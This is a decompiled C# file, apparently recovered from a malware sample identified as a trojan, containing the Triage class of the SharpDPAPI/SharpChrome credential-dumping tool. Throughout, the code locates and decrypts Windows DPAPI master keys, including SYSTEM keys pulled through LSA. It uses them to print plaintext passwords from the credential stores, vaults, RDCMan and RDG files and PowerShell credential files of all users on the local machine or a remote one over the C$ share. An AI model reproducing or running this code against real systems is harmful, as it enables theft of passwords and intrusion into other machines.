// Decompiled with JetBrains decompiler
// Type: SharpDPAPI.Triage
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;

namespace SharpDPAPI
{
  public class Triage
  {
    public static Dictionary<string, string> TriageUserMasterKeys(
      byte[] backupKeyBytes,
      bool show = false,
      string computerName = "")
    {
      Dictionary<string, string> mappings = new Dictionary<string, string>();
      if (!string.IsNullOrEmpty(computerName) && !Helpers.TestRemote(computerName))
        return new Dictionary<string, string>();
      if (Helpers.IsHighIntegrity() || !string.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName))
      {
        foreach (string directory1 in Directory.GetDirectories(string.IsNullOrEmpty(computerName) ? string.Format("{0}\\Users\\", (object) Environment.GetEnvironmentVariable("SystemDrive")) : string.Format("\\\\{0}\\C$\\Users\\", (object) computerName)))
        {
          string[] strArray = directory1.Split('\\');
          string str = strArray[strArray.Length - 1];
          if (!directory1.EndsWith("Public") && !directory1.EndsWith("Default") && !directory1.EndsWith("Default User") && !directory1.EndsWith("All Users"))
          {
            string path = string.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", (object) directory1);
            if (Directory.Exists(path))
            {
              foreach (string directory2 in Directory.GetDirectories(path))
              {
                foreach (string file in Directory.GetFiles(directory2))
                {
                  if (Regex.IsMatch(file, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                  {
                    Path.GetFileName(file);
                    if (show)
                      Console.WriteLine("[*] Found MasterKey : {0}", (object) file);
                    byte[] masterKeyBytes = File.ReadAllBytes(file);
                    try
                    {
                      Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes).ToList<KeyValuePair<string, string>>().ForEach((Action<KeyValuePair<string, string>>) (x => mappings.Add(x.Key, x.Value)));
                    }
                    catch (Exception ex)
                    {
                      Console.WriteLine("[X] Error triaging {0} : {1}", (object) file, (object) ex.Message);
                    }
                  }
                }
              }
            }
          }
        }
      }
      else
      {
        Environment.GetEnvironmentVariable("USERNAME");
        string path = string.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", (object) Environment.GetEnvironmentVariable("USERPROFILE"));
        if (Directory.Exists(path))
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            foreach (string file in Directory.GetFiles(directory))
            {
              if (Regex.IsMatch(file, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
              {
                Path.GetFileName(file);
                if (show)
                  Console.WriteLine("[*] Found MasterKey : {0}", (object) file);
                byte[] masterKeyBytes = File.ReadAllBytes(file);
                try
                {
                  Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes).ToList<KeyValuePair<string, string>>().ForEach((Action<KeyValuePair<string, string>>) (x => mappings.Add(x.Key, x.Value)));
                }
                catch (Exception ex)
                {
                  Console.WriteLine("[X] Error triaging {0} : {1}", (object) file, (object) ex.Message);
                }
              }
            }
          }
        }
      }
      return mappings;
    }

    public static Dictionary<string, string> TriageSystemMasterKeys(bool show = false)
    {
      Dictionary<string, string> mappings = new Dictionary<string, string>();
      if (Helpers.IsHighIntegrity())
      {
        List<byte[]> dpapiKeys = LSADump.GetDPAPIKeys(true);
        foreach (string directory in Directory.GetDirectories(string.Format("{0}\\Windows\\System32\\Microsoft\\Protect\\", (object) Environment.GetEnvironmentVariable("SystemDrive"))))
        {
          string[] files = Directory.GetFiles(directory);
          string[] strArray = new string[0];
          if (Directory.Exists(string.Format("{0}\\User\\", (object) directory)))
            strArray = Directory.GetFiles(string.Format("{0}\\User\\", (object) directory));
          foreach (string str in files)
          {
            if (Regex.IsMatch(str, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
            {
              Path.GetFileName(str);
              if (show)
                Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", (object) str);
              byte[] masterKeyBytes = File.ReadAllBytes(str);
              try
              {
                Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, dpapiKeys[0]).ToList<KeyValuePair<string, string>>().ForEach((Action<KeyValuePair<string, string>>) (x => mappings.Add(x.Key, x.Value)));
              }
              catch (Exception ex)
              {
                Console.WriteLine("[X] Error triaging {0} : {1}", (object) str, (object) ex.Message);
              }
            }
          }
          foreach (string str in strArray)
          {
            if (Regex.IsMatch(str, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
            {
              Path.GetFileName(str);
              if (show)
                Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", (object) str);
              byte[] masterKeyBytes = File.ReadAllBytes(str);
              try
              {
                Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, dpapiKeys[1]).ToList<KeyValuePair<string, string>>().ForEach((Action<KeyValuePair<string, string>>) (x => mappings.Add(x.Key, x.Value)));
              }
              catch (Exception ex)
              {
                Console.WriteLine("[X] Error triaging {0} : {1}", (object) str, (object) ex.Message);
              }
            }
          }
        }
      }
      else
        Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM masterkeys!\r\n");
      return mappings;
    }

    public static void TriageUserCreds(Dictionary<string, string> MasterKeys, string computerName = "")
    {
      if (!string.IsNullOrEmpty(computerName) && !Helpers.TestRemote(computerName))
        return;
      if (Helpers.IsHighIntegrity() || !string.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName))
      {
        Console.WriteLine("[*] Triaging Credentials for ALL users\r\n");
        foreach (string directory in Directory.GetDirectories(string.IsNullOrEmpty(computerName) ? string.Format("{0}\\Users\\", (object) Environment.GetEnvironmentVariable("SystemDrive")) : string.Format("\\\\{0}\\C$\\Users\\", (object) computerName)))
        {
          string[] strArray = directory.Split('\\');
          string str = strArray[strArray.Length - 1];
          if (!directory.EndsWith("Public") && !directory.EndsWith("Default") && !directory.EndsWith("Default User") && !directory.EndsWith("All Users"))
          {
            Triage.TriageCredFolder(string.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", (object) directory), MasterKeys);
            Triage.TriageCredFolder(string.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", (object) directory), MasterKeys);
          }
        }
      }
      else
      {
        Console.WriteLine("[*] Triaging Credentials for current user\r\n");
        Triage.TriageCredFolder(string.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", (object) Environment.GetEnvironmentVariable("USERPROFILE")), MasterKeys);
        Triage.TriageCredFolder(string.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", (object) Environment.GetEnvironmentVariable("USERPROFILE")), MasterKeys);
      }
    }

    public static void TriageUserVaults(Dictionary<string, string> MasterKeys, string computerName = "")
    {
      if (!string.IsNullOrEmpty(computerName) && !Helpers.TestRemote(computerName))
        return;
      if (Helpers.IsHighIntegrity() || !string.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName))
      {
        Console.WriteLine("[*] Triaging Vaults for ALL users\r\n");
        foreach (string directory1 in Directory.GetDirectories(string.IsNullOrEmpty(computerName) ? string.Format("{0}\\Users\\", (object) Environment.GetEnvironmentVariable("SystemDrive")) : string.Format("\\\\{0}\\C$\\Users\\", (object) computerName)))
        {
          string[] strArray1 = directory1.Split('\\');
          string str = strArray1[strArray1.Length - 1];
          if (!directory1.EndsWith("Public") && !directory1.EndsWith("Default") && !directory1.EndsWith("Default User") && !directory1.EndsWith("All Users"))
          {
            string[] strArray2 = new string[2]
            {
              string.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", (object) directory1),
              string.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", (object) directory1)
            };
            foreach (string path in strArray2)
            {
              if (Directory.Exists(path))
              {
                foreach (string directory2 in Directory.GetDirectories(path))
                {
                  if (Regex.IsMatch(directory2, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                    Triage.TriageVaultFolder(directory2, MasterKeys);
                }
              }
            }
          }
        }
      }
      else
      {
        Console.WriteLine("[*] Triaging Vaults for the current user\r\n");
        string path1 = string.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", (object) Environment.GetEnvironmentVariable("USERPROFILE"));
        if (Directory.Exists(path1))
        {
          foreach (string directory in Directory.GetDirectories(path1))
          {
            if (Regex.IsMatch(directory, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
              Triage.TriageVaultFolder(directory, MasterKeys);
          }
        }
        string path2 = string.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", (object) Environment.GetEnvironmentVariable("USERPROFILE"));
        if (!Directory.Exists(path2))
          return;
        foreach (string directory in Directory.GetDirectories(path2))
        {
          if (Regex.IsMatch(directory, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
            Triage.TriageVaultFolder(directory, MasterKeys);
        }
      }
    }

    public static void TriageSystemCreds(Dictionary<string, string> MasterKeys)
    {
      if (Helpers.IsHighIntegrity())
      {
        Console.WriteLine("\r\n[*] Triaging System Credentials\r\n");
        string[] strArray = new string[6]
        {
          string.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials", (object) Environment.GetEnvironmentVariable("SystemRoot"))
        };
        foreach (string folder in strArray)
          Triage.TriageCredFolder(folder, MasterKeys);
      }
      else
        Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM credentials!\r\n");
    }

    public static void TriageSystemVaults(Dictionary<string, string> MasterKeys)
    {
      if (Helpers.IsHighIntegrity())
      {
        Console.WriteLine("\r\n[*] Triaging SYSTEM Vaults\r\n");
        string[] strArray = new string[6]
        {
          string.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault", (object) Environment.GetEnvironmentVariable("SystemRoot")),
          string.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault", (object) Environment.GetEnvironmentVariable("SystemRoot"))
        };
        foreach (string path in strArray)
        {
          if (Directory.Exists(path))
          {
            foreach (string directory in Directory.GetDirectories(path))
            {
              if (Regex.IsMatch(directory, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                Triage.TriageVaultFolder(directory, MasterKeys);
            }
          }
        }
      }
      else
        Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM vaults!\r\n");
    }

    public static void TriageVaultFolder(string folder, Dictionary<string, string> MasterKeys)
    {
      string path1 = string.Format("{0}\\Policy.vpol", (object) folder);
      if (!File.Exists(path1))
        return;
      Console.WriteLine("\r\n[*] Triaging Vault folder: {0}", (object) folder);
      ArrayList AESKeys = Dpapi.DescribePolicy(File.ReadAllBytes(path1), MasterKeys);
      if (AESKeys.Count <= 0)
        return;
      string[] files = Directory.GetFiles(folder);
      if (files == null || files.Length == 0)
        return;
      foreach (string path2 in files)
      {
        if (Path.GetFileName(path2).EndsWith("vcrd"))
        {
          byte[] vaultBytes = File.ReadAllBytes(path2);
          try
          {
            Dpapi.DescribeVaultCred(vaultBytes, AESKeys);
          }
          catch (Exception ex)
          {
            Console.WriteLine("[X] Error triaging {0} : {1}", (object) path2, (object) ex.Message);
          }
        }
      }
    }

    public static void TriageCredFolder(string folder, Dictionary<string, string> MasterKeys)
    {
      if (!Directory.Exists(folder))
        return;
      string[] files = Directory.GetFiles(folder);
      if (files == null || files.Length == 0)
        return;
      Console.WriteLine("\r\nFolder       : {0}\r\n", (object) folder);
      foreach (string credFilePath in files)
      {
        try
        {
          Triage.TriageCredFile(credFilePath, MasterKeys);
        }
        catch (Exception ex)
        {
          Console.WriteLine("[X] Error triaging {0} : {1}", (object) credFilePath, (object) ex.Message);
        }
      }
    }

    public static void TriageCredFile(string credFilePath, Dictionary<string, string> MasterKeys)
    {
      Console.WriteLine("  CredFile           : {0}\r\n", (object) Path.GetFileName(credFilePath));
      byte[] credentialBytes = File.ReadAllBytes(credFilePath);
      try
      {
        Dpapi.DescribeCredential(credentialBytes, MasterKeys);
      }
      catch (Exception ex)
      {
        Console.WriteLine("[X] Error triaging {0} : {1}", (object) credFilePath, (object) ex.Message);
      }
      Console.WriteLine();
    }

    public static void TriageRDCMan(
      Dictionary<string, string> MasterKeys,
      string computerName = "",
      bool unprotect = false)
    {
      if (!string.IsNullOrEmpty(computerName) && !Helpers.TestRemote(computerName))
        return;
      if (Helpers.IsHighIntegrity() || !string.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName))
      {
        Console.WriteLine("[*] Triaging RDCMan.settings Files for ALL users\r\n");
        foreach (string directory in Directory.GetDirectories(string.IsNullOrEmpty(computerName) ? string.Format("{0}\\Users\\", (object) Environment.GetEnvironmentVariable("SystemDrive")) : string.Format("\\\\{0}\\C$\\Users\\", (object) computerName)))
        {
          string[] strArray = directory.Split('\\');
          string str = strArray[strArray.Length - 1];
          if (!directory.EndsWith("Public") && !directory.EndsWith("Default") && !directory.EndsWith("Default User") && !directory.EndsWith("All Users"))
          {
            string rdcManFile = string.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", (object) directory);
            Triage.TriageRDCManFile(MasterKeys, rdcManFile, unprotect);
          }
        }
      }
      else
      {
        Console.WriteLine("[*] Triaging RDCMan Settings Files for current user\r\n");
        Environment.GetEnvironmentVariable("USERNAME");
        string rdcManFile = string.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", (object) Environment.GetEnvironmentVariable("USERPROFILE"));
        Triage.TriageRDCManFile(MasterKeys, rdcManFile, unprotect);
      }
    }

    public static void TriagePSCredFile(
      Dictionary<string, string> MasterKeys,
      string credFile,
      bool unprotect = false)
    {
      if (File.Exists(credFile))
      {
        DateTime lastAccessTime = File.GetLastAccessTime(credFile);
        DateTime lastWriteTime = File.GetLastWriteTime(credFile);
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(credFile);
        Console.WriteLine("    CredFile         : {0}", (object) credFile);
        Console.WriteLine("    Accessed         : {0}", (object) lastAccessTime);
        Console.WriteLine("    Modified         : {0}", (object) lastWriteTime);
        XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("Props");
        if (elementsByTagName.Count > 0)
        {
          string innerText1 = elementsByTagName[0].ChildNodes[0].InnerText;
          string innerText2 = elementsByTagName[0].ChildNodes[1].InnerText;
          Console.WriteLine("    User Name        : {0}", (object) innerText1);
          byte[] byteArray = Helpers.StringToByteArray(innerText2);
          if (byteArray.Length != 0)
          {
            byte[] numArray1 = Dpapi.DescribeDPAPIBlob(byteArray, MasterKeys, "blob", unprotect);
            if (numArray1 != null && numArray1.Length != 0)
            {
              int length = Array.LastIndexOf<byte>(numArray1, (byte) 0);
              string str;
              if (length > 1)
              {
                byte[] numArray2 = new byte[length + 1];
                Array.Copy((Array) numArray1, 0, (Array) numArray2, 0, length);
                str = Encoding.Unicode.GetString(numArray2);
              }
              else
                str = Encoding.ASCII.GetString(numArray1);
              Console.WriteLine("    Password         : {0}", (object) str);
            }
          }
        }
        Console.WriteLine();
      }
      else
        Console.WriteLine("\r[X]  PSCredential .xml file '{0}' is not accessible or doesn't exist!\n", (object) credFile);
    }

    public static void TriageRDCManFile(
      Dictionary<string, string> MasterKeys,
      string rdcManFile,
      bool unprotect = false)
    {
      if (!File.Exists(rdcManFile))
        return;
      DateTime lastAccessTime = File.GetLastAccessTime(rdcManFile);
      DateTime lastWriteTime = File.GetLastWriteTime(rdcManFile);
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(rdcManFile);
      Console.WriteLine("    RDCManFile    : {0}", (object) rdcManFile);
      Console.WriteLine("    Accessed      : {0}", (object) lastAccessTime);
      Console.WriteLine("    Modified      : {0}", (object) lastWriteTime);
      XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("recentlyUsed");
      if (elementsByTagName1[0]["server"] != null)
        Console.WriteLine("    Recent Server : {0}", (object) elementsByTagName1[0]["server"].InnerText);
      XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("credentialsProfile");
      if (elementsByTagName2 != null && elementsByTagName2.Count != 0)
        Console.WriteLine("\r\n        Cred Profiles");
      foreach (XmlNode credProfileNode in elementsByTagName2)
      {
        Console.WriteLine();
        Triage.DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
      }
      XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("logonCredentials");
      if (elementsByTagName3 != null && elementsByTagName3.Count != 0)
        Console.WriteLine("\r\n        Default Logon Credentials");
      foreach (XmlNode credProfileNode in elementsByTagName3)
      {
        Console.WriteLine();
        Triage.DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
      }
      foreach (XmlNode childNode in xmlDocument.GetElementsByTagName("FilesToOpen")[0].ChildNodes)
      {
        if (Interop.PathIsUNC(rdcManFile))
        {
          if (!Interop.PathIsUNC(childNode.InnerText))
          {
            string uncPath = Helpers.ConvertLocalPathToUNCPath(rdcManFile.Split(new char[1]
            {
              '\\'
            }, StringSplitOptions.RemoveEmptyEntries)[0], childNode.InnerText);
            Triage.TriageRDGFile(MasterKeys, uncPath, unprotect);
          }
          else
            Triage.TriageRDGFile(MasterKeys, childNode.InnerText, unprotect);
        }
        else
          Triage.TriageRDGFile(MasterKeys, childNode.InnerText, unprotect);
      }
      Console.WriteLine();
    }

    public static void DisplayCredProfile(
      Dictionary<string, string> MasterKeys,
      XmlNode credProfileNode,
      bool unprotect = false)
    {
      string innerText1 = credProfileNode["profileName"].InnerText;
      if (credProfileNode["userName"] == null)
      {
        Console.WriteLine("          Cred Profile : {0}", (object) innerText1);
      }
      else
      {
        string str1 = credProfileNode["userName"].InnerText.Trim();
        string str2 = credProfileNode["domain"].InnerText.Trim();
        string innerText2 = credProfileNode["password"].InnerText;
        string str3 = "";
        string str4 = !string.IsNullOrEmpty(str2) ? string.Format("{0}\\{1}", (object) str2, (object) str1) : str1;
        Console.WriteLine("          Profile Name : {0}", (object) innerText1);
        Console.WriteLine("            UserName   : {0}", (object) str4);
        byte[] blobBytes = Convert.FromBase64String(innerText2);
        if (blobBytes.Length == 0)
          return;
        byte[] numArray1 = Dpapi.DescribeDPAPIBlob(blobBytes, MasterKeys, "rdg", unprotect);
        if (numArray1.Length != 0)
        {
          int length = Array.LastIndexOf<byte>(numArray1, (byte) 0);
          if (length > 1)
          {
            byte[] numArray2 = new byte[length + 1];
            Array.Copy((Array) numArray1, 0, (Array) numArray2, 0, length);
            str3 = Encoding.Unicode.GetString(numArray2);
          }
          else
            str3 = Encoding.ASCII.GetString(numArray1);
        }
        Console.WriteLine("            Password   : {0}", (object) str3);
      }
    }

    public static void TriageRDGFile(
      Dictionary<string, string> MasterKeys,
      string rdgFilePath,
      bool unprotect = false)
    {
      if (File.Exists(rdgFilePath))
      {
        Console.WriteLine("\r\n      {0}", (object) rdgFilePath);
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(rdgFilePath);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("credentialsProfile");
        if (elementsByTagName1 != null && elementsByTagName1.Count != 0)
          Console.WriteLine("\r\n        Cred Profiles");
        foreach (XmlNode credProfileNode in elementsByTagName1)
        {
          Console.WriteLine();
          Triage.DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
        }
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("server");
        if (elementsByTagName2 != null && elementsByTagName2.Count != 0)
          Console.WriteLine("\r\n        Servers");
        foreach (XmlNode xmlNode in elementsByTagName2)
        {
          try
          {
            if (xmlNode["properties"]["name"] != null)
            {
              if (xmlNode["properties"]["displayName"] != null)
                Console.WriteLine("\r\n          Name         : {0} ({1})", (object) xmlNode["properties"]["name"].InnerText, (object) xmlNode["properties"]["displayName"].InnerText);
              else
                Console.WriteLine("\r\n          Name         : {0}", (object) xmlNode["properties"]["name"].InnerText);
              if (xmlNode["logonCredentials"] != null)
                Triage.DisplayCredProfile(MasterKeys, (XmlNode) xmlNode["logonCredentials"], unprotect);
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine("Exception: {0}", (object) ex);
          }
        }
      }
      else
        Console.WriteLine("\r\n      [X] .RDG file '{0}' is not accessible or doesn't exist!", (object) rdgFilePath);
    }

    public static void TriageRDGFolder(
      Dictionary<string, string> MasterKeys,
      string folder,
      bool unprotect)
    {
      if (!Directory.Exists(folder))
        return;
      string[] files = Directory.GetFiles(folder);
      if (files == null || files.Length == 0)
        return;
      Console.WriteLine("\r\nFolder       : {0}\r\n", (object) folder);
      foreach (string rdgFilePath in files)
      {
        if (rdgFilePath.EndsWith(".rdg"))
        {
          try
          {
            Triage.TriageRDGFile(MasterKeys, rdgFilePath, unprotect);
          }
          catch (Exception ex)
          {
            Console.WriteLine("[X] Error triaging {0} : {1}", (object) rdgFilePath, (object) ex.Message);
          }
        }
      }
    }
  }
}
